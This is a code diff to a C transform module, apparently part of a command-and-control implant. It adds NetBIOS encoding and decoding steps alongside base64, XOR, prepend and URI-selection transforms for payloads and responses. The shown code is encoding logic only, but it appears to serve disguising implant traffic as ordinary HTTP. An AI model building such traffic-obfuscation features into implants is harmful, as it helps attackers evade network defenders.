@@ -26,6 +26,8 @@
 #define TRANSFORM__COOKIE 0xB           // Additional cookie header value (no payload)
 #define TRANSFORM__BODY 0xC             // Probably don't need this
 #define TRANSFORM__HOSTHEADER 0xD       // not implemented yet
+#define TRANSFORM_NETBIOS 0xE           
+#define TRANSFORM_NETBIOSU 0xF          
 
 // Initialize a transform struct
 BOOL TransformInit(TRANSFORM* transform, SIZE_T maxSize)
@@ -87,17 +89,15 @@ BOOL TransformApply(TRANSFORM* transform, PBYTE bufferIn, UINT32 bufferLen, unsi
         PCHAR   uri     = NULL; 
         SIZE_T  uriLen  = 0;
         if (i == ri) {
-            uri             = ParserStringCopy(&parser, &uriLen);   // null terminated
+            uri             = ParserStringCopy(&parser, &uriLen);   // allocates 
             selectedUri     = uri;
             // Don't break cause we need to shift parser through all data
         } else {
             // Still need to read off the data from the parser
             uri = ParserGetString(&parser, &uriLen);
         }
-        //_dbg("[TRANSFORM] FOUND URI nmbr %d \"%s\"", i + 1, uri);
     }
     
-    //_dbg("[TRANSFORM] Selected URI \"%s\"", selectedUri);
     snprintf(transform->uri, MAX_URI, "%s", selectedUri);
     LocalFree(selectedUri);
 
@@ -111,7 +111,7 @@ BOOL TransformApply(TRANSFORM* transform, PBYTE bufferIn, UINT32 bufferLen, unsi
             case TRANSFORM_BASE64URL:
 			case TRANSFORM_BASE64:
 			{
-                // _dbg("[TRANSFORM_BASE64] Applying...");//DEBUG
+                // _dbg("[TRANSFORM_BASE64] Applying...");
 				
                 outlen = calculate_base64_encoded_size(transformedLength);
                 char* temp_encoded = (char *)LocalAlloc(LPTR, outlen + 1);
@@ -200,6 +200,20 @@ BOOL TransformApply(TRANSFORM* transform, PBYTE bufferIn, UINT32 bufferLen, unsi
                 memset(transform->transformed, 0, transform->outputLength);
                 memcpy(transform->transformed, transform->temp, transformedLength);
                 break;
+            }
+            case TRANSFORM_NETBIOS:
+			case TRANSFORM_NETBIOSU:
+            {
+                // _dbg("[TRANSFORM_NETBIOS] Applying...");
+                
+				transformedLength = to_netbios(step == TRANSFORM_NETBIOSU ? 'A' : 'a', transform->transformed, transformedLength, transform->temp, transform->outputLength);
+
+				if (transformedLength == 0)
+					return FALSE;
+
+				memset(transform->transformed, 0, transform->outputLength);
+				memcpy(transform->transformed, transform->temp, transformedLength);
+				break;
             }
             // Prepends value to payload
             case TRANSFORM_PREPEND:
@@ -355,6 +369,7 @@ BOOL TransformReverse(char* recoverable, DWORD recoverableLength, SIZE_T* recove
 	if (temp == NULL)
 		return FALSE;
 
+    DWORD tempLen = recoverableLength;
 
     PARSER parser;
     ParserDataParse(&parser, resProfile, MAX_RESPONSE_PROFILE);
@@ -384,7 +399,7 @@ BOOL TransformReverse(char* recoverable, DWORD recoverableLength, SIZE_T* recove
             recoverableLength = outlen;
 
             if (recoverableLength == 0)
-					return FALSE;
+                return FALSE;
 
             memcpy(recoverable, temp, recoverableLength);
             break;
@@ -427,6 +442,21 @@ BOOL TransformReverse(char* recoverable, DWORD recoverableLength, SIZE_T* recove
                 _err("xor_encode transformation failed");
                 return FALSE;
             }
+
+            if (recoverableLength == 0)
+                return FALSE;
+
+            memcpy(recoverable, temp, recoverableLength);
+            recoverable[recoverableLength] = 0;
+            break;
+        }
+        case TRANSFORM_NETBIOS:
+        case TRANSFORM_NETBIOSU:
+        {
+            // _dbg("[TRANSFORM_NETBIOS] Reversing...%d bytes", recoverableLength);
+
+            recoverable[recoverableLength] = 0;
+            recoverableLength = from_netbios(step == TRANSFORM_NETBIOSU ? 'A' : 'a', recoverable, recoverableLength, temp, maxGet);
 
             if (recoverableLength == 0)
                 return FALSE;
